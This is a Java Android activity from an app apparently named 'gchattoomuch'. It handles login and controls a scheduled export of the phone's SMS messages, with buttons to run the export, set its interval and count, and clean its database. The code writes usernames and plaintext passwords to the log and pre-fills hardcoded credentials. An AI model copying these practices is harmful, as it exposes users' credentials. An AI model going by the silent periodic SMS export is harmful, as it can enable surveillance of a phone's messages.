package org.gdocument.gchattoomuch.auth;

import java.util.concurrent.CountDownLatch;

import org.gdocument.gchattoomuch.R;
import org.gdocument.gchattoomuch.business.SmsReceiverBusiness;
import org.gdocument.gchattoomuch.constrant.ConstantsAuthentification;
import org.gdocument.gchattoomuch.log.Logger;
import org.gdocument.gchattoomuch.manager.AuthentificationManager;
import org.gdocument.gchattoomuch.manager.ScheduleServiceManager;
import org.gdocument.gchattoomuch.parser.SmsParser;
import org.gdocument.gchattoomuch.task.UserLoginTask;

import android.accounts.Account;
import android.accounts.AccountAuthenticatorActivity;
import android.accounts.AccountManager;
import android.app.Dialog;
import android.app.ProgressDialog;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.DialogInterface.OnClickListener;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.provider.ContactsContract;
import android.text.TextUtils;
import android.view.View;
import android.view.Window;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;

import com.cameleon.common.android.factory.FactoryDialog;
import com.cameleon.common.android.factory.listener.OnClickViewListener;
import com.prasanta.GSSAct;

/**
 * Activity which displays login screen to the user.
 */

//http://developer.android.com/resources/samples/SampleSyncAdapter/index.html

public class AuthentificationActivity extends AccountAuthenticatorActivity implements UserLoginTask.IAuthenticationResult {

	/** The Intent flag to confirm credentials. */
    public static final String PARAM_CONFIRM_CREDENTIALS = "confirmCredentials";
    public static final String PARAM_AUTOLOGIN = "autologin";

    /** The Intent extra to store password. */
    public static final String PARAM_PASSWORD = "password";

    /** The Intent extra to store username. */
    public static final String PARAM_USERNAME = "username";

    /** The Intent extra to store username. */
    public static final String PARAM_AUTHTOKEN_TYPE = "authtokenType";

    /** The tag used to log to adb console. */
    private static final String TAG = "AuthenticatorActivity";
    private AccountManager mAccountManager;

    /** Keep track of the login task so can cancel it if requested */
    private UserLoginTask mAuthTask = null;

    /** Keep track of the progress dialog so we can dismiss it */
    private ProgressDialog mProgressDialog = null;

    /**
     * If set we are just checking that the user knows their credentials; this
     * doesn't cause the user's password or authToken to be changed on the
     * device.
     */
    private Boolean mConfirmCredentials = false;

    /** for posting authentication attempts back to UI thread */
    private final Handler mHandler = new Handler();

    private TextView mMessage;

    private String mPassword;

    private EditText mPasswordEdit;
    private Button mBtnSendSms;

    /** Was the original caller asking for an entirely new account? */
    protected boolean mRequestNewAccount = false;

    private String mUsername;

    private EditText mUsernameEdit;
	private Intent intentResult;
//	private Bundle authBundle;

    /**
     * {@inheritDoc}
     */
    @Override
    public void onCreate(Bundle data) {

        logMe(TAG, "onCreate(" + data + ")");
        super.onCreate(data);
        mAccountManager = AccountManager.get(this);
        logMe(TAG, "loading data from Intent");
        final Intent intent = getIntent();
        mUsername = intent.getStringExtra(PARAM_USERNAME);
        mRequestNewAccount = mUsername == null;
        mConfirmCredentials = intent.getBooleanExtra(PARAM_CONFIRM_CREDENTIALS, false);
        logMe(TAG, "    request new: " + mRequestNewAccount);
        requestWindowFeature(Window.FEATURE_LEFT_ICON);
        setContentView(R.layout.authentification);
        getWindow().setFeatureDrawableResource(Window.FEATURE_LEFT_ICON, android.R.drawable.ic_dialog_alert);
        mMessage = (TextView) findViewById(R.id.message);
        mUsernameEdit = (EditText) findViewById(R.id.username_edit);
        mPasswordEdit = (EditText) findViewById(R.id.password_edit);
        mBtnSendSms = (Button) findViewById(R.id.btn_send_sms);
        if (!TextUtils.isEmpty(mUsername)) mUsernameEdit.setText(mUsername);
        mMessage.setText(getMessage());

        mUsernameEdit.setText(AuthentificationManager.USER_NAME);
        mPasswordEdit.setText(AuthentificationManager.PASSWORD);

//        if (intent.getBooleanExtra(PARAM_AUTOLOGIN, false)) {
//        	handleLogin(null);
//        }
//        SpreadSheetManager.getInstance(this);
 }

    /*
     * {@inheritDoc}
     */
    @Override
    protected Dialog onCreateDialog(int id, Bundle args) {
        final ProgressDialog dialog = new ProgressDialog(this);
        dialog.setMessage(getText(R.string.ui_activity_authenticating));
        dialog.setIndeterminate(true);
        dialog.setCancelable(true);
        dialog.setOnCancelListener(new DialogInterface.OnCancelListener() {
            public void onCancel(DialogInterface dialog) {
                logMe(TAG, "user cancelling authentication");
                if (mAuthTask != null) {
                    mAuthTask.cancel(true);
                }
                mProgressDialog = null;
            }
        });
        // We save off the progress dialog in a field so that we can dismiss
        // it later. We can't just call dismissDialog(0) because the system
        // can lose track of our dialog if there's an orientation change.
        mProgressDialog = dialog;
        return dialog;
    }

    /**
     * Handles onClick event on the Submit button. Sends username/password to
     * the server for authentication. The button is configured to call
     * handleLogin() in the layout XML.
     *
     * @param view The Submit button for which this method is invoked
     */
    public void onClickLogin(View view) {
        extractLoginData();
        if (TextUtils.isEmpty(mUsername) || TextUtils.isEmpty(mPassword)) {
            mMessage.setText(getMessage());
        } else {
            // Show a progress dialog, and kick off a background task to perform
            // the user login attempt.
            showProgress();
            CountDownLatch countDownLatch = new CountDownLatch(1);
            mAuthTask = new UserLoginTask(this, mUsername, mPassword, countDownLatch);
            mAuthTask.execute();
            try {
				countDownLatch.await();
			} catch (InterruptedException e) {
				logMe(e);
			}
        }
    }

    public void onClickSendSms(View view) {
    	OnClickListener onClickOkListener = new OnClickListener() {
			
			public void onClick(DialogInterface dialog, int which) {
				logMe("onClickSendSms - START");
//				extractLoginData();

//		        logMe("onClickSendSms UserLoginTask execute");
//				UserLoginTask authTask = new UserLoginTask(this, mUsername, mPassword);
//		        authTask.execute();

		    	launchExportSms();
				logMe("onClickSendSms 'btn_send_report' - END");
			}
		};
    	FactoryDialog.getInstance().buildOkCancelDialog(this, onClickOkListener, R.string.app_name, R.string.btn_text_send_sms).show();
    }

    public void onClickCleanDb(View view) {
    	OnClickListener onClickOkListener = new OnClickListener() {
			
			public void onClick(DialogInterface dialog, int which) {
		    	try {
			    	SmsReceiverBusiness business = new SmsReceiverBusiness(AuthentificationActivity.this);
			    	String message = SmsParser.getInstance().prepareMessage(SmsParser.MSG_TYPE.CLEAN_DB, null);
					business.processMessage("ACTIVITY", message);
		    	} catch (RuntimeException ex) {
		    		logMe(ex);
		    	}
			}
		};
    	FactoryDialog.getInstance().buildOkCancelDialog(this, onClickOkListener, R.string.app_name, R.string.btn_text_clean_db).show();
    }

    public void onClickSetServiceExportSmsTime(View view) {
    	OnClickViewListener onClickOkListener = new OnClickViewListener() {
			
			public void onClick(DialogInterface dialog, View view, int which) {
		    	try {
		    		TextView textView = (TextView)view;
		    		String value = textView.getText().toString();
		        	SmsReceiverBusiness business = new SmsReceiverBusiness(AuthentificationActivity.this);
		        	String message = SmsParser.getInstance().prepareMessage(SmsParser.MSG_TYPE.SET_SERVICE_EXPORT_SMS_TIME, value);
		    		business.processMessage(TAG, message);
		    	} catch (RuntimeException ex) {
		    		logMe(ex);
		    	}
			}
		};
		long time = ScheduleServiceManager.getInstance(this).getServiceExportSmsScheduleTime();
    	FactoryDialog.getInstance().buildEditTextDialog(this, onClickOkListener, R.string.btn_text_set_service_export_sms_time, Long.toString(time)).show();
    }

    public void onClickSetServiceExportSmsCount(View view) {
    	OnClickViewListener onClickOkListener = new OnClickViewListener() {
			
			public void onClick(DialogInterface dialog, View view, int which) {
		    	try {
		    		TextView textView = (TextView)view;
		    		String value = textView.getText().toString();
		        	SmsReceiverBusiness business = new SmsReceiverBusiness(AuthentificationActivity.this);
		        	String message = SmsParser.getInstance().prepareMessage(SmsParser.MSG_TYPE.SET_SERVICE_EXPORT_SMS_COUNT, value);
		    		business.processMessage("ACTIVITY", message);
		    	} catch (RuntimeException ex) {
		    		logMe(ex);
		    	}
			}
		};
		int count = ScheduleServiceManager.getInstance(this).getServiceExportSmsLimitCount();
    	FactoryDialog.getInstance().buildEditTextDialog(this, onClickOkListener, R.string.app_name, Integer.toString(count)).show();
    }

    public void onClickRunServiceExportSms(View view) {
    	OnClickListener onClickOkListener = new OnClickListener() {
			
			public void onClick(DialogInterface dialog, int which) {
		    	try {
		        	SmsReceiverBusiness business = new SmsReceiverBusiness(AuthentificationActivity.this);
		        	String message = SmsParser.getInstance().prepareMessage(SmsParser.MSG_TYPE.RUN_SERVICE_EXPORT_SMS, null);
		    		business.processMessage("ACTIVITY", message);
		    	} catch (RuntimeException ex) {
		    		logMe(ex);
		    	}
			}
		};
    	FactoryDialog.getInstance().buildOkCancelDialog(this, onClickOkListener, R.string.app_name, R.string.btn_text_run_service_export_sms).show();
    }

    public void onClickGssClient(View view) {
    	startActivity(new Intent(this, GSSAct.class));
    }

    public void onAuthenticationFinish(String authToken) {
    }

    /**
     * Called when the authentication process completes (see attemptLogin()).
     *
     * @param authToken the authentication token returned by the server, or NULL if
     *            authentication failed.
     */
    public void onAuthenticationResult(String authToken) {
        logMe(TAG, "onAuthenticationResult START");

        AuthentificationManager.getInstance(getApplicationContext()).onAuthenticationResult(authToken);

        boolean success = (((authToken != null) && (authToken.length() > 0)) || !AuthentificationManager.isDoAuthentification());
        logMe(TAG, "onAuthenticationResult success:" + success + " mConfirmCredentials:"+mConfirmCredentials);

        // Our task is complete, so clear it out
        mAuthTask = null;

        mBtnSendSms.setEnabled(success);

        // Hide the progress dialog
        hideProgress();

        if (success) {
//        	createAuthBundle(authToken);

        	if (AuthentificationManager.isDoAuthentification()) {
	        	if (!mConfirmCredentials) {
	                finishLogin(authToken);
	            } else {
	                finishConfirmCredentials(success);
	            }
        	}

        	launchExportSms();

        } else {
            logEr(TAG, "onAuthenticationResult: failed to authenticate");
            if (mRequestNewAccount) {
                // "Please enter a valid username/password.
                mMessage.setText(getText(R.string.login_activity_loginfail_text_both));
            } else {
                // "Please enter a valid password." (Used when the
                // account is already in the database but the password
                // doesn't work.)
                mMessage.setText(getText(R.string.login_activity_loginfail_text_pwonly));
            }
        }
        logMe(TAG, "onAuthenticationResult END");
    }

    public void onAuthenticationCancel() {
        logMe(TAG, "onAuthenticationCancel()");

        AuthentificationManager.getInstance(getApplicationContext()).onAuthenticationCancel();

        // Our task is complete, so clear it out
        mAuthTask = null;

        // Hide the progress dialog
        hideProgress();
    }

	private void extractLoginData() {
		if (mRequestNewAccount) {
            mUsername = mUsernameEdit.getText().toString();
        }
        mPassword = mPasswordEdit.getText().toString();
	}

    /**
     * Called when response is received from the server for confirm credentials
     * request. See onAuthenticationResult(). Sets the
     * AccountAuthenticatorResult which is sent back to the caller.
     *
     * @param result the confirmCredentials result.
     */
    private void finishConfirmCredentials(boolean result) {
        logMe(TAG, "finishConfirmCredentials Username:" + mUsername + " Password:" + mPassword);
        final Account account = new Account(mUsername, ConstantsAuthentification.ACCOUNT_TYPE);
        mAccountManager.setPassword(account, mPassword);
        intentResult.putExtra(AccountManager.KEY_BOOLEAN_RESULT, result);
        setAccountAuthenticatorResult(intentResult.getExtras());
//        setResult(RESULT_OK, intentResult);
//        finish();
    }

    /**
     * Called when response is received from the server for authentication
     * request. See onAuthenticationResult(). Sets the
     * AccountAuthenticatorResult which is sent back to the caller. We store the
     * authToken that's returned from the server as the 'password' for this
     * account - so we're never storing the user's actual password locally.
     *
     * @param result the confirmCredentials result.
     */
    private void finishLogin(String authToken) {

        logMe(TAG, "finishLogin Username:" + mUsername + " Password:" + mPassword);
        final Account account = new Account(mUsername, ConstantsAuthentification.ACCOUNT_TYPE);
        logMe(TAG, "finishLogin account:"+account);
        if (mRequestNewAccount) {
        	Bundle userData = null;//new Bundle();
            logMe(TAG, "finishLogin addAccountExplicitly BEFORE");
            mAccountManager.addAccountExplicitly(account, mPassword, userData);
            logMe(TAG, "finishLogin addAccountExplicitly AFTER");
            // Set contacts sync for this account.
            logMe(TAG, "finishLogin setSyncAutomatically BEFORE");
            ContentResolver.setSyncAutomatically(account, ContactsContract.AUTHORITY, true);
            logMe(TAG, "finishLogin setSyncAutomatically AFTER");
        } else {
            logMe(TAG, "finishLogin setPassword BEFORE");
            mAccountManager.setPassword(account, mPassword);
            logMe(TAG, "finishLogin setPassword AFTER");
        }
        intentResult = new Intent();
        intentResult.putExtra(AccountManager.KEY_AUTHTOKEN, authToken);
        intentResult.putExtra(AccountManager.KEY_ACCOUNT_NAME, mUsername);
        intentResult.putExtra(AccountManager.KEY_ACCOUNT_TYPE, ConstantsAuthentification.ACCOUNT_TYPE);
        setAccountAuthenticatorResult(intentResult.getExtras());
//        setResult(RESULT_OK, intentResult);s
//        finish();
    }

    private void launchExportSms() {
        logMe("launchExportSms scheduleExportSms time:" + ScheduleServiceManager.SERVICE_EXPORT_SMS_SCHEDULE_TIME_SECOUND_10);
		ScheduleServiceManager.getInstance(this).scheduleExportSms(ScheduleServiceManager.SERVICE_EXPORT_SMS_SCHEDULE_TIME_SECOUND_10);
    }

    /**
     * Returns the message to be displayed at the top of the login dialog box.
     */
    private CharSequence getMessage() {
        getString(R.string.label);
        if (TextUtils.isEmpty(mUsername)) {
            // If no username, then we ask the user to log in using an
            // appropriate service.
            final CharSequence msg = getText(R.string.login_activity_newaccount_text);
            return msg;
        }
        if (TextUtils.isEmpty(mPassword)) {
            // We have an account but no password
            return getText(R.string.login_activity_loginfail_text_pwmissing);
        }
        return null;
    }
    
//   	private void createAuthBundle(String authToken) {
// 		logMe("onResultAuthentification AUTH_TOKEN_REQUEST authToken:"+(authToken==null || authToken.length() < 20 ? authToken : authToken.subSequence(0,  20) + "[...]") );
//
//		this.authBundle = new Bundle();
//		if (authToken!=null) {
//			String[] l = authToken.split(";");
//			for(int i=0 ; i<l.length ; i++) {
//				String[] j = l[i].split(":");
//				if (j.length==2) {
//					String value = j[1];
//					logMe("onResultAuthentification AUTH_TOKEN_REQUEST authBundle add key:"+j[0]+" value:"+((value==null || value.length() < 20 ? value : value.subSequence(0,  20) + "[...]")));
//					authBundle.putString(j[0], j[1]);
//				}
//			}
//		}
//   	}

    /**
     * Shows the progress UI for a lengthy operation.
     */
    private void showProgress() {
        showDialog(0);
    }

    /**
     * Hides the progress UI for a lengthy operation.
     */
    private void hideProgress() {
        if (mProgressDialog != null) {
            mProgressDialog.dismiss();
            mProgressDialog = null;
        }
    }

	private void logMe(String msg) {
		Logger.logMe(TAG, msg);
	}

	private static void logMe(Exception ex) {
		Logger.logMe(TAG, ex);
    }

	private static void logMe(String tag, String msg) {
		Logger.logMe(tag, msg);
    }

	private static void logEr(String tag, String msg) {
		Logger.logEr(tag, msg);
    }

	private class BroadcastReceiverSendSms extends BroadcastReceiver {
		@Override
		public void onReceive(Context context, Intent intent) {
			logMe("sendReportReceiver resultReceiver onReceive START");
			logMe("sendReportReceiver resultReceiver onReceive hideProgress");
			hideProgress();
			logMe("sendReportReceiver resultReceiver onReceive END");
		}

	};
}